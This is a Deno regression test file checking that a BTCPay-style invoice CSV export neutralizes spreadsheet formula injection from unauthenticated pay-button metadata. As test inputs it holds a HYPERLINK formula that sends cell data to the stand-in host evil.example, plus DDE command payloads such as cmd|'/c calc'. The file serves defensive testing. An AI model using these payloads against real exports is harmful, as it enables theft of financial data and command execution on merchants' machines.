// A05 (Injection) regression tests: spreadsheet-formula injection in the
// BTCPay-equivalent CSV export.
//
// Run from supabase/functions:
//   deno test --allow-read --allow-env _shared/csv-injection.test.ts
//
// THREAT MODEL — why this is not merely a merchant typing "=" into their own
// notes. Enabling the Pay Button sets the BTCPay store setting
// `anyoneCanCreateInvoice`, and the merchant then PUBLISHES the store id inside
// the pay-button HTML/link on their public website (see buildPayButtonOutput).
// BTCPay's public pay-button endpoint accepts `orderId` and `checkoutDesc` from
// an UNAUTHENTICATED browser, and stores them on the invoice's metadata. That
// metadata is flattened into the merchant's exported CSV by
// report-rows.ts::flattenReportMetadata. So a remote, unauthenticated attacker
// chooses the exact text of a cell in a financial file the merchant later opens
// in Excel / LibreOffice / Google Sheets.
//
// RFC 4180 quoting does NOT stop this: a spreadsheet strips the surrounding
// quotes first and then evaluates a leading =/+/-/@ as a formula. These tests
// therefore assert on the value a spreadsheet would see, not on the raw bytes.

import { assert, assertEquals } from 'jsr:@std/assert@1.0.19';

import { buildReportRows, collectMetadataColumns, reportRowsToCsv } from './report-rows.ts';
import type { BtcpayInvoice } from './btcpay-client.ts';

/** Splits one RFC 4180 record into the cell values a spreadsheet would parse. */
function parseCsvRow(line: string): string[] {
  const cells: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (quoted) {
      if (ch === '"') {
        if (line[i + 1] === '"') {
          cell += '"';
          i++;
        } else {
          quoted = false;
        }
      } else {
        cell += ch;
      }
    } else if (ch === '"') {
      quoted = true;
    } else if (ch === ',') {
      cells.push(cell);
      cell = '';
    } else {
      cell += ch;
    }
  }
  cells.push(cell);
  return cells;
}

function csvFor(invoices: BtcpayInvoice[]): { header: string[]; rows: string[][] } {
  const rows = invoices.flatMap((inv) => buildReportRows(inv));
  const csv = reportRowsToCsv(rows, collectMetadataColumns(rows));
  const lines = csv.split('\r\n').filter((l) => l !== '');
  return { header: parseCsvRow(lines[0]), rows: lines.slice(1).map(parseCsvRow) };
}

/** A settled invoice carrying attacker-chosen public pay-button metadata. */
function invoiceWithMetadata(metadata: Record<string, unknown>): BtcpayInvoice {
  return {
    id: 'inv-1',
    currency: 'USD',
    amount: '10.00',
    paidAmount: '10.00',
    status: 'Settled',
    createdTime: 1_756_000_000,
    metadata,
    paymentMethods: [
      {
        paymentMethodId: 'BTC-CHAIN',
        currency: 'BTC',
        rate: '100000.00',
        payments: [
          {
            id: 'txid-0',
            value: '0.0001',
            fee: '0',
            status: 'Settled',
            receivedDate: 1_756_000_100,
            destination: 'bc1qexample',
          },
        ],
      },
    ],
  };
}

/** Would a spreadsheet treat this parsed cell as a formula / DDE payload? */
function isFormulaCell(value: string): boolean {
  return /^[=+\-@\t\r]/.test(value);
}

const cellAt = (header: string[], row: string[], column: string): string =>
  row[header.indexOf(column)] ?? '';

// ---------------------------------------------------------------------------
// The core attack: unauthenticated pay-button orderId lands in the export.
// ---------------------------------------------------------------------------

Deno.test('an attacker-supplied orderId cannot become a spreadsheet formula', () => {
  // Exfiltrates neighbouring cells (payment addresses, buyer emails) on open.
  const payload = '=HYPERLINK("https://evil.example/?d="&A2,"Refund receipt")';
  const { header, rows } = csvFor([invoiceWithMetadata({ orderId: payload })]);

  const cell = cellAt(header, rows[0], 'orderId');
  assert(
    !isFormulaCell(cell),
    `orderId cell is evaluated as a formula by a spreadsheet: ${JSON.stringify(cell)}`,
  );
  // Neutralized, not destroyed: the merchant must still be able to read it.
  assert(cell.includes('evil.example'), 'the original text must remain legible');
});

Deno.test('every formula-leading prefix is neutralized in metadata cells', () => {
  const payloads: Record<string, string> = {
    equals: "=cmd|'/c calc'!A1",
    plus: '+1+1',
    at: '@SUM(1+1)*cmd|\'/c calc\'!A1',
    minus: '-2+3+cmd|\'/c calc\'!A0',
    tab: '\t=1+1',
    carriageReturn: '\r=1+1',
  };
  const { header, rows } = csvFor([invoiceWithMetadata(payloads)]);

  for (const key of Object.keys(payloads)) {
    const cell = cellAt(header, rows[0], key);
    assert(
      !isFormulaCell(cell),
      `metadata column ${key} is a live formula cell: ${JSON.stringify(cell)}`,
    );
  }
});

Deno.test('the invoice comment column cannot become a formula', () => {
  const { header, rows } = csvFor([
    invoiceWithMetadata({ comment: '=1+1', orderId: 'ord-1' }),
  ]);
  const cell = cellAt(header, rows[0], 'InvoiceComment');
  assert(!isFormulaCell(cell), `InvoiceComment is a live formula cell: ${JSON.stringify(cell)}`);
});

Deno.test('a formula-leading metadata KEY cannot become a formula header cell', () => {
  // Cart item ids become `${itemId}-${field}` column NAMES, and the header row
  // is written through the same serializer as the data rows.
  const { header } = csvFor([
    invoiceWithMetadata({
      posData: { cart: [{ id: '=1+1', count: 2, price: 5 }] },
    }),
  ]);
  for (const name of header) {
    assert(!isFormulaCell(name), `header cell is a live formula: ${JSON.stringify(name)}`);
  }
});

// ---------------------------------------------------------------------------
// Do not corrupt legitimate accounting values.
// ---------------------------------------------------------------------------

Deno.test('a negative InvoiceDue (overpayment) is left exactly as-is', () => {
  const invoice = invoiceWithMetadata({ orderId: 'ord-1' });
  invoice.paidAmount = '12.50'; // paid 12.50 against a 10.00 price -> due -2.50
  const { header, rows } = csvFor([invoice]);
  assertEquals(cellAt(header, rows[0], 'InvoiceDue'), '-2.50');
});

Deno.test('ordinary values, numbers and timestamps pass through untouched', () => {
  const { header, rows } = csvFor([
    invoiceWithMetadata({ orderId: 'ORDER-42', buyerEmail: 'buyer@example.com' }),
  ]);
  const row = rows[0];
  assertEquals(cellAt(header, row, 'orderId'), 'ORDER-42');
  assertEquals(cellAt(header, row, 'buyerEmail'), 'buyer@example.com');
  assertEquals(cellAt(header, row, 'InvoicePrice'), '10.00');
  assertEquals(cellAt(header, row, 'PaymentAmount'), '0.0001');
  assertEquals(cellAt(header, row, 'InvoiceCreatedDate'), '2025-08-24T01:46:40.000Z');
  assertEquals(cellAt(header, row, 'PaymentAddress'), 'bc1qexample');
  assertEquals(cellAt(header, row, 'InvoiceStatus'), 'Settled');
});
